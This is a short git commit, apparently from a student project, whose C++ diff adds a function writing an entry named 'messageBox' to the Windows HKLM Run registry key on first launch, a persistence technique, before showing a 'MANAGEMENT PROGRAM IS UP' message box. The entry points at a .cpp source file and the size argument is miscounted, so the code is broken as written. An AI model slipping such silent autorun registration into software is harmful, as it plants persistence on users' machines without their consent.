7b0fc767b977da7ffcca77cb66f83d4197e4e28c
eitanadmoni <eitanadmoni@mail.tau.ac.il>
2025-07-01 14:00:46 +0300

    te

--- ttwin/technai.cpp
+++ ttwin/technai.cpp
@@ -5,9 +5,20 @@
 
 
 std::mutex lock;
+static bool first = TRUE;
 
+void setRegistry() {
+	HKEY hkey;
+	PHKEY phkResult = &hkey;
+	RegOpenKeyA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", phkResult);
+	RegSetValueExA(hkey, "messageBox", 0, REG_SZ, (const BYTE*)"C:\\Users\\user\\source\\repos\\eitanadmoni\\twin\\ttwin\\technai.cpp", sizeof("C:\\Users\\user\\source\\repos\\eitanadmoni\\twin\\ttwin\\technai.cpp") + 1);
+}
 
 int main() {
+	if (first) {
+		setRegistry();
+		first = FALSE;
+	}
 	if (lock.try_lock()) {
 		LPCSTR message = "MANAGEMENT PROGRAM IS UP";
 		MessageBoxA(NULL, message, "message", MB_OK);
